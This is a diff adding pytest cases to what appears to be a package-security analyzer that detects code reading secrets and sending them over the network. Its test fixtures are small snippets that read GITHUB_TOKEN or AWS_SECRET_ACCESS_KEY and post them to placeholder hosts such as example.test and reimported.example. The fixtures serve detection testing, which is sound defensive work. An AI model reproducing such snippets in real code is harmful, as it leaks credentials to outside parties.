@@ -8,6 +8,7 @@ import devpi_guardian.analyzers.astutil as astutil_module
 from devpi_guardian.analyzers.astutil import (
     AnalysisLimitExceeded,
     build_alias_table,
+    credential_accesses,
     find_credential_network_flows,
     parse_python,
     scan_calls,
@@ -320,6 +321,63 @@ class Api:
     flows = find_credential_network_flows(ast.parse(source), source)
     assert [(flow.source.description, flow.sink.qualified_name) for flow in flows] == [
         ("os.getenv('GITHUB_TOKEN')", "httpx.Client.post")
+    ]
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        """
+import os, requests
+def send(os):
+    token = os.getenv("GITHUB_TOKEN")
+    requests.post("https://example.test", data=token)
+""",
+        """
+import os, requests
+os = Fake()
+token = os.getenv("GITHUB_TOKEN")
+requests.post("https://example.test", data=token)
+""",
+        """
+import os, requests
+def send(os):
+    token = os.environ["GITHUB_TOKEN"]
+    requests.post("https://example.test", data=token)
+""",
+    ],
+)
+def test_credential_accesses_ignore_shadowed_os_aliases(source: str) -> None:
+    tree = ast.parse(source)
+
+    assert credential_accesses(tree, source) == []
+    assert find_credential_network_flows(tree, source) == []
+
+
+def test_credential_accesses_follow_import_reimport_and_closure_scopes() -> None:
+    source = """
+import os, requests
+def captured():
+    token = os.getenv("GITHUB_TOKEN")
+    requests.post("https://captured.example", data=token)
+
+os = Fake()
+os.getenv("GITHUB_TOKEN")
+import os
+token = os.environ["AWS_SECRET_ACCESS_KEY"]
+requests.post("https://reimported.example", data=token)
+"""
+    tree = ast.parse(source)
+
+    accesses = credential_accesses(tree, source)
+    assert [item.description for item in accesses] == [
+        "os.getenv('GITHUB_TOKEN')",
+        "os.environ['AWS_SECRET_ACCESS_KEY']",
+    ]
+    flows = find_credential_network_flows(tree, source)
+    assert [(flow.source.description, flow.sink.qualified_name) for flow in flows] == [
+        ("os.getenv('GITHUB_TOKEN')", "requests.post"),
+        ("os.environ['AWS_SECRET_ACCESS_KEY']", "requests.post"),
     ]
 
 
